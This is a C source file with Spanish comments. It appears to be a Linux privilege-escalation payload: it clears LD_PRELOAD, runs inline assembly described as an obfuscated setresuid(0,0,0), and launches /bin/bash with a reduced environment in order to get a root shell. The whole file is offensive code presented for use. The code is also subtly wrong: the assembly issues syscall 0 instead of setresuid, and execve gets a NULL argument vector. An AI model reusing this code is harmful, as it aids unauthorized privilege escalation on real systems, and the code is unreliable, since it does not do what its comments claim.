

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>

// ofuscar la llamada a `unsetenv` 
void _unset_ldpreload() {
    char *var = "LD_PRELOAD";
    char *val = getenv(var);
    if (val != NULL) {
        //  variable de entorno de forma indirecta
        unsetenv(var);
    }
}

// ofuscar `setresuid`
void _set_uid() {
    // Ofuscamos el llamado a `setresuid(0, 0, 0)`
    __asm__(
        "movl $0, %eax;"
        "movl %eax, %ebx;"
        "movl %eax, %ecx;"
        "movl %eax, %edx;"
        "int $0x80;"
    );
}

//  ejecutar el shell con un entorno manipulado
void _execute_shell() {
    //  `system` con un comando Bash en un contexto controlado
    char *env[] = {"PATH=/bin:/usr/bin", "SHELL=/bin/bash", NULL};
    execve("/bin/bash", NULL, env);  // Ejecuta bash con el entorno manipulado
}

void _init() {
    // Aplicamos técnicas de ofuscación
    _unset_ldpreload();    // Llamada indirecta para eliminar LD_PRELOAD
    _set_uid();            // Llamada ofuscada para elevar privilegios

    // Aseguramos que el shell se ejecute con privilegios elevados
    _execute_shell();      // Inicia un shell con un entorno manipulado
}

int main() {
    // Función de inicialización compleja
    _init();
    return 0;
}
